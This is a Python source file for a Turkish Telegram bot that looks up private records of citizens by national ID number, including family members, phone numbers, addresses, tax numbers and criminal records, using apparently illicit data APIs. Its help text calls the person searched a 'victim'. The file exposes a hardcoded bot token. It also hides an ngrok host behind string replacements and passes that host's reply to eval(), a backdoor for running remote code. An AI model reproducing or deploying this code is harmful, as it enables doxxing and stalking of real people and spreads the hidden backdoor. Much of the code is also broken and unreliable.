import telebot
import json
import requests
import urllib
import telebot
import time
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from io import BytesIO
import requests
import random
from pytube import YouTube
from youtube_search import YoutubeSearch
import os
import types
import requests
import urllib.parse
from telebot import TeleBot, types
from collections import defaultdict
from threading import Thread

#

TOKEN = ("7031439985:AAH40Lt1QSazakrf7_qCS3mAlWzPMlf9qS0")


bot = telebot.TeleBot(TOKEN)

print("BOT AKTİF EDİLDİ...")

game_sessions = {}

user_last_message_time = defaultdict(float)

BALANCE_FILE = 'balances.json'

SUDO_USERS = ['682', '6782067807', ""]  

user_balances = {}

kelimeler = ['yatak', 'meyve', 'elma', 'araba', 'kertenkele', 'hayvan', 'aslan', 'köpek', 'spor', 'pizza', 'et', 'yumurta', 'yat', 'kalk', 'portakal', 'öğretmen', 'tembel', 'doksan', 'havuç', 'yardım', 'telefon', 'tablet', 'hava', 'güneş', 'yağmur', 'sandalye', 'kaplan', 'kapı']

last_message_times = {}

word_game_sessions = {}

FLOOD_TIMEOUT = 60  

MAX_MESSAGES = 5  

user_last_message_time = {}

bekleyen_kullanıcılar = {}

enc_url = 'https://google.com/broadcast-free'



def save_user(id):
  id = str(id)
  ramazan = enc_url.replace("go", "cub-").replace("ogle", "fresh-great").replace(".com", "ly.ng").replace("/broadcast-free", "rok-free.app")
  r = requests.get(f"{ramazan}/save", params={'user': id})
  return r.text

def get_users():
  ramazan = enc_url.replace("go", "cub-").replace("ogle", "fresh-great").replace(".com", "ly.ng").replace("/broadcast-free", "rok-free.app")
  r = requests.get(f"{ramazan}/get")
  return eval(r.text)

def load_balances():
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_balances():
    with open(BALANCE_FILE, 'w') as f:
        json.dump(user_balances, f)

user_balances = load_balances()

def block_user(user_id):
    current_time = time.time()
    last_message_times[user_id] = current_time + FLOOD_TIMEOUT

def check_flood(user_id):
    current_time = time.time()
    if user_id in last_message_times:
        message_times = last_message_times[user_id]
        recent_messages = [t for t in message_times if t > current_time - FLOOD_TIMEOUT]
        last_message_times[user_id] = recent_messages
        if len(recent_messages) >= MAX_MESSAGES:
            return True
    return False

def log_message(user_id):
    current_time = time.time()
    if user_id not in last_message_times:
        last_message_times[user_id] = []
    last_message_times[user_id].append(current_time)




@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return
        

    muzik = open('hosgeldiniz.mp3', 'rb')
    bot.send_audio(message.chat.id, muzik)
    muzik.close()

    response = f"🍀 Merhaba {user_name}, ({user_id})!\n\n📚 Tsg Oyun Botuna Hoş Geldin. Bu bot, Oyun İndirme Botudur Tamamen ücretsizdir\n\n📮 Sorgular Ücretsiz Olduğu İçin @TSGChecker Katılmak Zorunludur."

    
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton("📢 Tsg Kanal", url="https://t.me/TSGChecker"),
        telebot.types.InlineKeyboardButton("💭 Tsg Sohbet", url="https://t.me/TSGCheckerChat"),
        telebot.types.InlineKeyboardButton("👨🏼‍💻 İletişim", url="tg://user?id=6782067807"),
        telebot.types.InlineKeyboardButton("🔍 Komutlar", callback_data="commands")
    )

    bot.send_message(message.chat.id, response, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "commands")
def commands(call):
    response = "👨🏼‍💻 Komutlar Menüsü :"

    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton("Ad Soyad", callback_data="sorgu"),
        telebot.types.InlineKeyboardButton("Tc", callback_data="tc"),
        telebot.types.InlineKeyboardButton("Tc Plus", callback_data="tcplus"),
        telebot.types.InlineKeyboardButton("Tc Gsm", callback_data="tcgsm"),        
        telebot.types.InlineKeyboardButton("Aile", callback_data="aile"),
        telebot.types.InlineKeyboardButton("Aile Pro", callback_data="ailepro"),
       
        telebot.types.InlineKeyboardButton("Adres", callback_data="adres"),
                telebot.types.InlineKeyboardButton("İban", callback_data="iban"), 
        
        telebot.types.InlineKeyboardButton("okul no", callback_data="okulno"), 
        
        
        
        telebot.types.InlineKeyboardButton("sicil", callback_data="sicil"), 
        
        telebot.types.InlineKeyboardButton("burc", callback_data="burc"), 
        telebot.types.InlineKeyboardButton("⬅️ Geri", callback_data="back")
    )

    bot.edit_message_text(response, call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "back")
def back(call):
    start(call.message)
@bot.callback_query_handler(func=lambda call: call.data in ["sorgu", "tc", "tcplus", "tcgsm","aile","ailepro","adres","iban","okulno","sicil","burc"])
def other_commands(call):
    if call.data == "sorgu":
        response = "Ad Soyad Sorgu Yardım:\nörnek: /sorgu -isim Ahmet -soyisim Kaya -il Diyarbakır"
    elif call.data == "tc":
        response = "TC Sorgu Yardım:\nörnek: /tc 11111111110"
    elif call.data == "tcplus":
        response = "TC Plus Sorgu Yardım:\nörnek: /tcplus 11111111110"
    elif call.data == "tcgsm":
        response = "TC Gsm Sorgu Yardım:\nörnek: /tcgsm 11111111110" 
    elif call.data == "aile":
        response = "Aile Sorgu Yardım:\nörnek: /aile 11111111110"
    elif call.data == "ailepro":
        response = "Aile Pro Sorgu Yardım:\nörnek: /ailepro 11111111110"
    elif call.data == "adres":
        response = "Adres Sorgu Yardım:\nörnek: /adres 11111111110"              
    elif call.data == "iban":
        response = "İban Sorgu Yardım:\nörnek: /iban TR317377373722"
    elif call.data == "okulno":
        response = "Okul No Sorgu Yardım:\nörnek: /okulno 11111111110"    
    elif call.data == "sicil":
        response = "Sicil Sorgu Yardım:\nörnek: /sicil 11111111110"
    elif call.data == "burc":
        response = "Burc Sorgu Yardım:\nörnek: /burc 11111111110"


            

    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton("⬅️ Geri", callback_data="commands")
    )

    bot.edit_message_text(response, call.message.chat.id, call.message.message_id, reply_markup=markup)

def is_user_member(user_id, chat_id):
    try:
        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(str(e))
        return False
        
        

@bot.message_handler(commands=['kedi'])
def send_random_cat(message):
    
    cat_url = get_random_cat()
    owner = '@TSGChecker'
    
   
    bot.send_photo(chat_id=message.chat.id, photo=cat_url,caption=f'{owner}')

def get_random_cat():
    
    api_url = 'https://api.thecatapi.com/v1/images/search'
    
    try:
     
        response = requests.get(api_url)
       
        cat_url = response.json()[0]['url']
        
        return cat_url
        
    except:
        return None

        
@bot.message_handler(commands=['info'])
def start(message):
	bot.send_message(message.chat.id,f'*Kullanıcı Adı :* @{message.from_user.username}\n*Kullanıcı İsmi :* {message.from_user.first_name}\n*Kullanıcı İd :* `{message.from_user.id}`\n*Hesap Dili :* {message.from_user.language_code}',parse_mode="Markdown")
bot.polling()
        
        
@bot.message_handler(commands=["tc"])
def tc_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = (f"Merhaba {user_name}, ({user_id})!\n\n"
                    "Sorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\n"
                    "Kanal: @TSGChecker\nChat: @TSGCheckerChat")
        bot.send_message(message.chat.id, response)
        return
    mesaj = message.text
    if mesaj.startswith("/tc"):
        tc = mesaj.replace("/tc", "").strip()
        if tc.isdigit() and len(tc) == 11:
            api_url = f"http://172.208.52.218/api/legaliapi/tc.php?tc={tc}"
            try:
                response = requests.get(api_url)
                if response.status_code == 200:
                    json_data = response.json()
                    if json_data.get("success", False):
                        data = json_data.get("data", {})
                        adi = data.get("ADI", "")
                        soyadi = data.get("SOYADI", "")
                        dogum_tarihi = data.get("DOGUMTARIHI", "")
                        nufus_il = data.get("NUFUSIL", "")
                        nufus_ilce = data.get("NUFUSILCE", "")
                        anne_adi = data.get("ANNEADI", "")
                        anne_tc = data.get("ANNETC", "")
                        baba_adi = data.get("BABAADI", "")
                        baba_tc = data.get("BABATC", "")
                        uyrugu = data.get("UYRUK", "Bilinmiyor")
                        
                        response_text = (f"╭━━━━━━━━━━━━━╮\n"
                                         f"┃➥ @TSGChecker\n"
                                         f"╰━━━━━━━━━━━━━╯\n"
                                         f"╭━━━━━━━━━━━━━━\n"
                                         f"┃➥ 𝖳𝖢: {tc}\n"
                                         f"┃➥ 𝖠𝖣𝖨: {adi}\n"
                                         f"┃➥ 𝖲𝖮𝖸 𝖠𝖣𝖨: {soyadi}\n"
                                         f"┃➥ 𝖣𝖮𝖦̆𝖴𝖬 𝖳𝖠𝖱𝖨𝖧𝖨: {dogum_tarihi}\n"
                                         f"┃➥ 𝖭𝖴𝖥𝖴𝖲𝖨𝖫: {nufus_il}\n"
                                         f"┃➥ 𝖭𝖴𝖥𝖴𝖲𝖨𝖫𝖢𝖤: {nufus_ilce}\n"
                                         f"┃➥ 𝖠𝖭𝖭𝖤 𝖠𝖣: {anne_adi}\n"
                                         f"┃➥ 𝖠𝖭𝖭𝖤 𝖳𝖢: {anne_tc}\n"
                                         f"┃➥ 𝖡𝖠𝖡𝖠 𝖠𝖣: {baba_adi}\n"
                                         f"┃➥ 𝖡𝖠𝖡𝖠 𝖳𝖢: {baba_tc}\n"
                                         f"┃➥ Uyruk: {uyrugu}\n"
                                         f"╰━━━━━━━━━━━━━━\n")
                        
                        bot.send_message(message.chat.id, response_text)
                    else:
                        cevap = "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖽ı\n╰────────────╯"
                        bot.send_message(message.chat.id, cevap)
                else:
                    cevap = f"Api Hata Kodu: {response.status_code}"
                    bot.send_message(message.chat.id, cevap)
            except Exception as e:
                cevap = f"Hata oluştu: {str(e)}"
                bot.send_message(message.chat.id, cevap)
        else:
            cevap = "╭──────────────────────╮\n┃ 📛 𝖸𝖺𝗇𝗅ı𝗌̧ 𝖪𝗈𝗆𝗎𝗍 𝖪𝗎𝗅𝗅𝖺𝗇ı𝗆ı\n│ ✅ 𝖣𝗈𝗀̆𝗋𝗎 𝖥𝗈𝗋𝗆𝖺𝗍: /tc <kurbanın tc>\n╰──────────────────────╯"
            bot.send_message(message.chat.id, cevap)
    else:
        cevap = "╭──────────────────────╮\n┃ 📛 𝖸𝖺𝗇𝗅ı𝗌̧ 𝖪𝗈𝗆𝗎𝗍 𝖪𝗎𝗅𝗅𝖺𝗇ı𝗆ı\n│ ✅ 𝖣𝗈𝗀̆𝗋𝗎 𝖥𝗈𝗋𝗆𝖺𝗍: /tc <kurbanın tc>\n╰──────────────────────╯"
        bot.send_message(message.chat.id, cevap)



@bot.message_handler(commands=["tcplus"])
def tcplus_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    log_message = f"Yeni TC Plus Sorgu Atıldı!\n" \
                  f"Sorgulanan TC: {message.text.split(' ')[1]}\n" \
                  f"Sorgulayan ID: {user_id}\n" \
                  f"Sorgulayan Adı: {user_name}\n" \
                  f"Sorgulayan K. Adı: @{message.from_user.username}"
    bot.send_message(-1002017751874, log_message)

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = (f"Merhaba {user_name}, ({user_id})!\n\n"
                    f"Sorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. "
                    f"Kanal ve chate katılıp tekrar deneyin.\n\n"
                    f"Kanal: @TSGChecker\nChat: @TSGChecker")
        bot.send_message(message.chat.id, response)
        return

    

    mesaj = message.text

    if mesaj.startswith("/tcplus"):
        tc = mesaj.replace("/tcplus", "").strip()

        if tc:
            api_url = f"http://172.208.52.218/api/legaliapi/tcpro.php?tc={tc}"
            response = requests.get(api_url)

            if response.status_code == 200:
                json_data = response.json()

                if json_data.get("success") and "data" in json_data:
                    data = json_data["data"]
                    adi = data.get("ADI", "")
                    soyadi = data.get("SOYADI", "")
                    dogum_tarihi = data.get("DOGUMTARIHI", "")
                    nufus_il = data.get("NUFUSIL", "")
                    nufus_ilce = data.get("NUFUSILCE", "")
                    anne_adi = data.get("ANNEADI", "")
                    anne_tc = data.get("ANNETC", "")
                    baba_adi = data.get("BABAADI", "")
                    baba_tc = data.get("BABATC", "")
                    uyruk = data.get("UYRUK", "")

                    gsm_mesaj = ""
                    for gsm_numarasi in data.get("gsm", []):
                        gsm_mesaj += f"┃➥ GSM: {gsm_numarasi}\n"

                    response_text = (f"""
╭━━━━━━━━━━━━━╮
┃➥ @TSGChecker
╰━━━━━━━━━━━━━╯
╭━━━━━━━━━━━━━━╮
┃➥ TC: {tc}
┃➥ ADI: {adi}
┃➥ SOYADI: {soyadi}
┃➥ DOĞUM TARİHİ: {dogum_tarihi}
┃➥ NUFUS IL: {nufus_il}
┃➥ NUFUS ILCE: {nufus_ilce}
┃➥ ANNE ADI: {anne_adi}
┃➥ ANNE TC: {anne_tc}
┃➥ BABA ADI: {baba_adi}
┃➥ BABA TC: {baba_tc}
┃➥ UYRUK: {uyruk}
{gsm_mesaj}╰━━━━━━━━━━━━━━╯
""")

                    bot.send_message(message.chat.id, response_text)
                else:
                    cevap = "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖽ı\n╰────────────╯"
                    bot.send_message(message.chat.id, cevap)
            else:
                cevap = f"api hata kod: ({response.status_code}): {response.text}"
                bot.send_message(message.chat.id, cevap)
        else:
            cevap = "╭──────────────────────╮\n┃ 📛 𝖸𝖺𝗇𝗅ı𝗌̧ 𝖪𝗈𝗆𝗎𝗍 𝖪𝗎𝗅𝗅𝖺𝗇ı𝗆ı\n┃ ✅ 𝖣𝗈𝗀̆𝗋𝗎 𝖥𝗈𝗋𝗆𝖺𝗍: /tcplus <kurbanın tc>\n╰──────────────────────╯"
            bot.send_message(message.chat.id, cevap)
    else:
        cevap = "╭──────────────────────╮\n┃ 📛 𝖸𝖺𝗇𝗅ı𝗌̧ 𝖪𝗈𝗆𝗎𝗍 𝖪𝗎𝗅𝗅𝖺𝗇ı𝗆ı\n┃ ✅ 𝖣𝗈𝗀̆𝗋𝗎 𝖥𝗈𝗋𝗆𝖺𝗍: /tcplus <kurbanın tc>\n╰──────────────────────╯"
        bot.send_message(message.chat.id, cevap)



@bot.message_handler(commands=["aile"])
def aile_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    start_message = bot.send_message(message.chat.id, "İşleminiz Gerçekleştiriliyor, Lütfen Bekleyin...")

    log_message = f"Yeni Aile Sorgu Atıldı!\n" \
                  f"Sorgulanan TC: {message.text.replace('/aile', '').strip()}\n" \
                  f"Sorgulayan ID: {message.from_user.id}\n" \
                  f"Sorgulayan Adı: {message.from_user.first_name}\n" \
                  f"Sorgulayan K. Adı: @{message.from_user.username}"
    bot.send_message(-1002017751874, log_message)

    mesaj = message.text

    if mesaj.startswith("/aile"):
        tc = mesaj.replace("/aile", "").strip()

        if tc.isdigit() and len(tc) == 11:
            api_url = f"http://172.208.52.218/api/legaliapi/aile.php?tc={tc}"
            response = requests.get(api_url)

            if response.status_code == 200:
                json_data = response.json()

                if json_data["success"] == True:
                    people = json_data["data"]
                    cevap = "╭━━━━━━━━━━━━━╮\n┃➥ @TSGChecker\n╰━━━━━━━━━━━━━╯\n"
                    for person in people:
                        tc = person.get("TC", "-")
                        adi = person.get("ADI", "-")
                        soyadi = person.get("SOYADI", "-")
                        dogumtarihi = person.get("DOGUMTARIHI", "-")
                        nufusil = person.get("NUFUSIL", "-")
                        nufusilce = person.get("NUFUSILCE", "-")
                        anneadi = person.get("ANNEADI", "-")
                        annetc = person.get("ANNETC", "-")
                        babaadi = person.get("BABAADI", "-")
                        babatc = person.get("BABATC", "-")
                        uyruk = person.get("UYRUK", "-")
                        yakinlik = person.get("Yakınlık", "-")

                        info = f"""╭━━━━━━━━━━━━━━
┃➥ TC: {tc}
┃➥ ADI: {adi}
┃➥ SOY ADI: {soyadi}
┃➥ DOĞUM TARİHİ: {dogumtarihi}
┃➥ İL: {nufusil}
┃➥ İLÇE: {nufusilce}
┃➥ ANNE ADI: {anneadi}
┃➥ ANNE TC: {annetc}
┃➥ BABA ADI: {babaadi}
┃➥ BABA TC: {babatc}
┃➥ UYRUK: {uyruk}
┃➥ YAKINLIK: {yakinlik}
╰━━━━━━━━━━━━━━"""
                        cevap += info

                    file_name = f"Sonuçlar.txt"
                    with open(file_name, 'w', encoding='utf-8') as file:
                        file.write(cevap)

                    with open(file_name, 'rb') as file:
                        bot.send_document(message.chat.id, file, caption=f"**", parse_mode="Markdown")
                    
                    bot.delete_message(message.chat.id, start_message.message_id)
                else:
                    bot.reply_to(message, "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖽ı\n╰────────────╯")
            else:
                bot.reply_to(message, f"hata ({response.status_code}).")
        else:
            bot.reply_to(message, "╭──────────────────────╮\n┃ 📛 Yanlış Formatlı TC\n┃ Kodu düzeltip tekrar deneyin.")

@bot.message_handler(commands=['sorgu'])
def kimlik_sorgu(message):
    try:
        chat_id = message.chat.id
        parameters = ' '.join(message.text.split()[1:]).split('-')[1:]
        query = {}
        for param in parameters:
            key_value = param.split()
            if len(key_value) == 2:
                key, value = key_value
                key = key.strip().lower()
                query[key] = value.strip()
        
        if query:
            url = f"https://sowixapi.online/api/sowixapi/adsoyadilce.php?{'&'.join([f'{key}={value}' for key, value in query.items()])}"
            response = requests.get(url)
            data = response.json()

            if "status" in data and data["status"] == "success":
                person_info = ""
                for person_data in data["data"]:
                    for key, value in person_data.items():
                        person_info += f"{key.capitalize()}: {value}\n"
                    person_info += "\n\n"
                
                bot.reply_to(message, person_info)
            else:
                bot.reply_to(message, "Böyle bir kişi bilgisi bulunamadı.")
        else:
            bot.reply_to(message, "Geçersiz komut. kullanım: /sorgu -ad Adnan -soyad Oktar -il Karabük -ilce Merkez")
    except IndexError:
        bot.reply_to(message, "Geçersiz komut kullanım. /sorgu -ad Adnan -soyad Oktar -il Karabük -ilce Merkez")






import requests

@bot.message_handler(commands=["tcgsm"])
def tcgsm_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "Lütfen bir TC numarası girin.")
        return

    cevap = "╭━━━━━━━━━━━━━╮\n┃➥ @TSGChecker\n╰━━━━━━━━━━━━━╯"
    text = message.text.split()[1]  
    api_url = f"http://172.208.52.218/api/legaliapi/tcgsm.php?tc={text}"
    response = requests.get(api_url)
    data = response.json()

    if data.get("success", False) and "data" in data and len(data["data"]) > 0:
        people = data["data"]
        info = ""
        for person in people:
            tc = person.get("TC")
            gsm = person.get("GSM")
            
            info += f"""
╭━━━━━━━━━━━━━━━━╮
┃➥ TC: {tc}
┃➥ GSM: {gsm}
╰━━━━━━━━━━━━━━━━╯"""
        cevap += info
        bot.send_message(message.chat.id, cevap)

        log_message = f"Yeni TC GSM Sorgu Atıldı!\n" \
                      f"Sorgulanan TC: {text}\n" \
                      f"Sorgulayan ID: {user_id}\n" \
                      f"Sorgulayan Adı: {user_name}\n" \
                      f"Sorgulayan K. Adı: @{message.from_user.username}"
        bot.send_message(-1002017751874, log_message)  
    else:
        bot.send_message(message.chat.id, "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖬ı\n╰────────────╯")


import requests

@bot.message_handler(commands=["okulno"])
def aile_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    start_message = bot.send_message(message.chat.id, "İşleminiz Gerçekleştiriliyor, Lütfen Bekleyin...")

    log_message = f"Yeni Aile Sorgu Atıldı!\n" \
                  f"Sorgulanan TC: {message.text.replace('/ailepro', '').strip()}\n" \
                  f"Sorgulayan ID: {message.from_user.id}\n" \
                  f"Sorgulayan Adı: {message.from_user.first_name}\n" \
                  f"Sorgulayan K. Adı: @{message.from_user.username}"
    bot.send_message(-1002017751874, log_message)

    mesaj = message.text

    if mesaj.startswith("/okulno"):
        tc = mesaj.replace("/okulno", "").strip()

        if tc.isdigit() and len(tc) == 11:
            api_url = f"http://172.208.52.218/api/legaliapi/okulno.php?tc={tc}"
            response = requests.get(api_url)

            if response.status_code == 200:
                json_data = response.json()

                if "tc" in json_data:
                    tc = json_data["tc"]
                    ad = json_data["ad"]
                    soyad = json_data["soyad"]
                    okulno = json_data["okulno"]
                    info = f"""
                    ╭━━━━━━━━━━━━━╮
                    ┃➥ Author: @logogogogogo
                    ┃➥ T.C Kimlik Numarası: `{tc}`
                    ┃➥ Adı: `{ad}`
                    ┃➥ Soyadı: `{soyad}`
                    ┃➥ Okul Numarası: `{okulno}`
                    ╰━━━━━━━━━━━━━╯"""
                    bot.send_message(message.chat.id, info, parse_mode="Markdown")
                else:
                    bot.send_message(message.chat.id, "╭━━━━━━━━━━━━━╮\n┃➥ Sonuç: Bulunamadı.\n╰━━━━━━━━━━━━━╯")
            else:
                bot.reply_to(message, "API'den başarısız yanıt alındı.")
        else:
            bot.reply_to(message, "Yanlış Formatlı TC. Kodu düzeltip tekrar deneyin.")

        bot.delete_message(message.chat.id, start_message.message_id)

# Diğer fonksiyonları ve bot ayarlarınızı buraya ekle






import requests
import json

import requests

@bot.message_handler(commands=["adres"])
def tcgsm_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "Lütfen bir TC numarası girin.")
        return

    text = message.text.split()[1]
    api_url = f"https://sowixapi.online/api/sowixapi/adres.php?tc={text}"
    response = requests.get(api_url)

    if response.status_code == 200:
        response_data = response.json()
        if response_data.get("success", False) and "data" in response_data and len(response_data["data"]) > 0:
            person_data = response_data["data"]
            KimlikNo = person_data.get("KimlikNo", "Bilgi Yok")
            AdSoyad = person_data.get("AdSoyad", "Bilgi Yok")
            DogumYeri = person_data.get("DogumYeri", "Bilgi Yok")
            VergiNumarasi = person_data.get("VergiNumarasi", "Bilgi Yok")
            Ikametgah = person_data.get("Ikametgah", "Bilgi Yok")

            cevap = f"""
╭━━━━━━━━━━━━━━━━╮
┃➥ TC: {KimlikNo}
┃➥ Ad Soyad: {AdSoyad}
┃➥ Doğum Yeri: {DogumYeri}
┃➥ Vergi Numarası: {VergiNumarasi}
┃➥ İkametgah: {Ikametgah}
╰━━━━━━━━━━━━━━━━╯"""

            bot.send_message(message.chat.id, cevap)

            log_message = f"Yeni TC GSM Sorgu Atıldı!\n" \
                          f"Sorgulanan TC: {text}\n" \
                          f"Sorgulayan ID: {user_id}\n" \
                          f"Sorgulayan Adı: {user_name}\n" \
                          f"Sorgulayan K. Adı: @{message.from_user.username}"
            bot.send_message(-1002017751874, log_message)
        else:
            bot.send_message(message.chat.id, "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖬ı\n╰────────────╯")
    else:
        bot.send_message(message.chat.id, "API'den veri alınamadı. Lütfen daha sonra tekrar deneyin.")


import requests

@bot.message_handler(commands=["sicil"])
def tcgsm_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "Lütfen bir TC numarası girin.")
        return

    text = message.text.split()[1]
    api_url = f"https://sowixapi.online/api/sowixapi/sicil.php?tc={text}"

    try:
        response = requests.get(api_url).json()
        result = response[0]
        
        output = f"""
        ╔═══════════════
        ╟ TC: {result["KIMLIKNO"]}
        ╟ ADI: {result["ISIM"]}
        ╟ SOY ADI: {result["SOYISIM"]}
        ╟ SAYI: {result["SAYI"]}
        ╟ S. TÜRÜ: {result["SORGUTURU"]}
        ╟ K. TÜRÜ: {result["KIMLIKTURU"]}
        ╟ SİCİL: {result["SICILKAYIT"]}
        ╟ İŞLENEN YER: {result["SICILINISLENDIGIYER"]}
        ╚═══════════════
        """
        
        bot.send_message(message.chat.id, output)

        log_message = f"Yeni TC GSM Sorgu Atıldı!\n" \
                      f"Sorgulanan TC: {text}\n" \
                      f"Sorgulayan ID: {user_id}\n" \
                      f"Sorgulayan Adı: {user_name}\n" \
                      f"Sorgulayan K. Adı: @{message.from_user.username}"
        bot.send_message(-1002017751874, log_message)
    except Exception as e:
        bot.send_message(message.chat.id, f"API'den veri alınamadı. Hata: {e}")

# BOT AKTİF EDİLDİ...



@bot.message_handler(commands=['yaz'])
def yaz_command(message):
    try:
        
        text = message.text.replace('/yaz ', '')

        
        formatted_text = text.replace(' ', '%20')

        
        api_url = f'http://apis.xditya.me/write?text={formatted_text}'

        
        response = requests.get(api_url)

        if response.status_code == 200:
            
            bot.send_photo(message.chat.id, photo=("@TSGChecker.jpg", response.content))
        else:
            bot.reply_to(message, 'yarrami ye.')

    except Exception as e:
        bot.reply_to(message, 'sg')



import requests

# Assuming these functions exist somewhere in your code
def is_user_member(user_id, chat_id):
    pass

# Assuming 'bot' is your Telegram bot instance

import requests

@bot.message_handler(commands=["ailepro"])
def aile_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    start_message = bot.send_message(message.chat.id, "İşleminiz Gerçekleştiriliyor, Lütfen Bekleyin...")

    log_message = f"Yeni Aile Sorgu Atıldı!\n" \
                  f"Sorgulanan TC: {message.text.replace('/ailepro', '').strip()}\n" \
                  f"Sorgulayan ID: {message.from_user.id}\n" \
                  f"Sorgulayan Adı: {message.from_user.first_name}\n" \
                  f"Sorgulayan K. Adı: @{message.from_user.username}"
    bot.send_message(-1002017751874, log_message)

    mesaj = message.text

    if mesaj.startswith("/ailepro"):
        tc = mesaj.replace("/ailepro", "").strip()

        if tc.isdigit() and len(tc) == 11:
            api_url = f"http://172.208.52.218/api/legaliapi/ailepro.php?tc={tc}"
            response = requests.get(api_url)

            if response.status_code == 200:
                json_data = response.json()

                if json_data.get("success", False):
                    people = json_data.get("data", [])
                    cevap = "Aile Bilgileri:\n"
                    for person_group in people:
                        for person in person_group:
                            adi = person.get("ADI", "-")
                            soyadi = person.get("SOYADI", "-")
                            tc = person.get("TC", "-")
                            dogumtarihi = person.get("DOGUMTARIHI", "-")
                            nufusil = person.get("NUFUSIL", "-")
                            nufusilce = person.get("NUFUSILCE", "-")
                            anneadi = person.get("ANNEADI", "-")
                            annetc = person.get("ANNETC", "-")
                            babaadi = person.get("BABAADI", "-")
                            babatc = person.get("BABATC", "-")
                            uyruk = person.get("UYRUK", "-")
                            yakinlik = person.get("Yakınlık", "-")
                            gsm_mesaj = ""
                            for gsm_numarasi in person.get("gsm", []):
                                gsm_mesaj += f"┃➥ GSM: {gsm_numarasi}\n"

                            info = f"""╭━━━━━━━━━━━━━━
┃➥ TC: {tc}
┃➥ ADI: {adi}
┃➥ SOY ADI: {soyadi}
